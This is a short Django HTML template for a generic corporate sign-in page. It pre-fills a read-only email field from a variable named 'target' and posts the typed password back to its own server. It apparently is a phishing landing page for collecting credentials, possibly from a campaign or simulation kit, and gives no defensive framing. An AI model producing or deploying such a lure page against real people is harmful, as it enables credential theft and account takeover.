<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In to your account</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background-color: white;
            padding: 44px;
            width: 360px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            border-top: 4px solid #005da6; /* Generic corporate blue */
        }
        .login-box img {
            max-width: 150px;
            margin-bottom: 24px;
        }
        .login-box h2 {
            font-size: 24px;
            margin-bottom: 16px;
            font-weight: 600;
            color: #1b1b1b;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 10px;
            font-size: 15px;
            border: 1px solid #666;
            box-sizing: border-box;
            margin-top: 8px;
        }
        .btn-submit {
            background-color: #005da6;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 15px;
            cursor: pointer;
            width: 100%;
            margin-top: 24px;
        }
        .btn-submit:hover {
            background-color: #004c87;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <h2>Sign In</h2>
        <p style="color: #666; font-size: 15px;">Continue to Corporate Portal</p>
        
        <form method="POST">
            {% csrf_token %}
            <div class="form-group">
                <input type="email" name="email" value="{{ target.email }}" readonly>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn-submit">Sign In</button>
        </form>
    </div>

</body>
</html>
